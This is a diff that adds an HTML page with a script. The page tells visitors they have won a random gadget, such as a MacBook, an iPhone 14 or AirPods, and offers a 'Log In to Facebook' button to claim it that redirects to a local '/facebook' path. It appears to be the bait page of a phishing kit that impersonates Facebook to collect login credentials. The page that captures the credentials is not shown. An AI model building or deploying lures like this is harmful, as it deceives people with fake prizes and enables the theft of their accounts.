@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="/Winner.css">
+</head>
+<body>
+
+   <div id="box">
+    <h3>Congratulations on winning the <span></span></h3>
+      
+    <div id="image_holder"> 
+        <img src="" alt="" id="img">
+
+    </div>
+    <div>
+        <span id="identifier">To claim the prize </span>
+    </div>
+    <div id="full_btn"> <button> <img src="images/facebook_logo.webp" alt=""><span>Log In to Facebook</span></button></div>
+        
+    
+   </div>
+</body>
+
+<script>
+    let images = [{url: 'images/macbook.jpg', name :"Macbook Air M1"} , 
+    {url: 'images/iphone.webp', name :"Iphone 14"},
+    {url: 'images/laptop.jpg', name :"Asus Rog Strix"},
+    {url: 'images/macbook.jpg', name :"Macbook Air M1"},
+    {url: 'images/earbuds.png', name :"Airpods pro 2"}
+    ]
+    let div = document.getElementById('img');
+     let span = document.getElementsByTagName('span')[0];
+     function showBox(){
+          let randomizer = Math.floor(Math.random()*images.length);
+        span.append(images[randomizer].name)
+        div.src = images[randomizer].url;
+     }
+     window.onload = () =>{
+        showBox()
+     }
+   
+
+   let btn = document.getElementsByTagName('button')[0];
+
+     btn.addEventListener('click',()=>{
+        window.location.href = '/facebook'
+     })
+</script>
+</html>
